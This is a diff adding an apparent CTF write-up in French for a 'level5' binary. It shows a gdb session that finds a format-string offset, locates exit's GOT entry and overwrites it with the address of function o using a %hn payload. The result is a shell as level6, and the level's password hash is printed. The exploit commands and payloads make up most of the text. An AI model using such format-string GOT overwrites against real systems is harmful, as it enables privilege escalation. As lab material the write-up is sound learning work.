@@ -1,0 +1,87 @@
+Note: Installer peda si cela n'est pas deja fait.
+
+gdb ./level5
+
+info function:
+-----> Le binaire contient 3 fonctions (main, o et n).
+
+source /tmp/peda/peda.py
+set disassembly-flavor intel
+
+b *0x080484f3
+b *0x080484f8
+
+r < <(python -c 'print "AAAA" + "%x %x %x %x"')
+----> 0x41414141 en 4eme position.
+
+r < <(python -c 'print "AAAABBBB" + "%4$n"')
+-----> crash car l'adresse 0x41414141 est invalide.
+
+p/x $edx
+---> $1 = 0x8
+p/x $eax
+---> $2 = 0x41414141
+===> On a voulu metre 8 dans 0x41414141
+
+global offset table (GOT):
+objdump -h level5
+--> .got          00000004  08049814  08049814  00000814  2**2
+
+
+objdump --dynamic-reloc ./level5 | grep exit
+---> 08049838 R_386_JUMP_SLOT   exit
+
+---------------------------------------
+
+====== Objectif: overwrite addr of exit by adresse of o:
+Dans gdb:
+
+x/i 0x08049838
+   0x8049838 <exit@got.plt>:	(bad)
+
+p o
+$2 = {<text variable, no debug info>} 0x80484a4 <o>
+On convertie l'adresse de o en base 10: 134513828.
+
+On soustrait 4 (pris par l'adresse de exit).
+
+r < <(python -c 'print "\x38\x98\x04\x08" + "%134513824u" + "-%4$hn"')
+
+-> [New process 4977]
+process 4977 is executing new program: /bin/dash
+[New process 4978]
+process 4978 is executing new program: /bin/dash
+
+/bin/dash s'est bien lance.
+On quite gdb.
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824u" + "-%4$hn"' > /tmp/tmpp
+
+cat /tmp/tmpp - | ./level5
+
+whoami
+--> level6
+
+cd /home/user/level6
+cat .pass
+
+--> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
